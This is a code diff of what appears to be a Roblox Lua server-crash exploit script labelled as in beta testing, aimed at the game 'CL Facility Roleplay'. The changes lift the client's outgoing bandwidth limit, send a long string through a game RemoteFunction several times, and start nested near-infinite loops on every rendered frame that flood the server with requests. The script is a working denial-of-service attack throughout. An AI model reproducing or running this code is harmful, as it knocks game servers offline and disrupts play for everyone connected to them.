@@ -7,7 +7,9 @@ Beta: True
 Credits
 ]]
 -- THIS IS IN BETA TESTING.
-printconsole = printconsole or warn
+printconsole = printconsole or (function(...)
+warn('[K~]: '...)
+end)()
 
 _G.CrashSettings = {
 	Enabled = true,
@@ -818,7 +820,13 @@ function C.K_6416498845() -- CL Facility Roleplay
 }
 ]]
 	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
-	SettingsService.RF.Set:InvokeServer({LongString});
+	for i = 1, 2 do game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge); SettingsService.RF.Set:InvokeServer({LongString}); end
+	spawn(function()
+	print('test mode!')
+	local j = SettingsService.RF.Get:InvokeServer()
+	print(j[1], j[1]:len())
+			end)
+
 	task.wait(3)	
 	--end
 	warn('Game server completed sending request!')
@@ -826,14 +834,11 @@ function C.K_6416498845() -- CL Facility Roleplay
 
 	game:GetService('RunService').RenderStepped:Connect(function()
 		for i = 1, 6500 do
-			spawn(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge) end)
 			for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
+				spawn(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge) end)
 				pcall(function()
 					SettingsService.RF.Get:InvokeServer()
-				end)   
-				pcall(function()
-					SettingsService.RF.Get:InvokeServer()
-				end)   
+				end)
 			end
 		end
 	end)
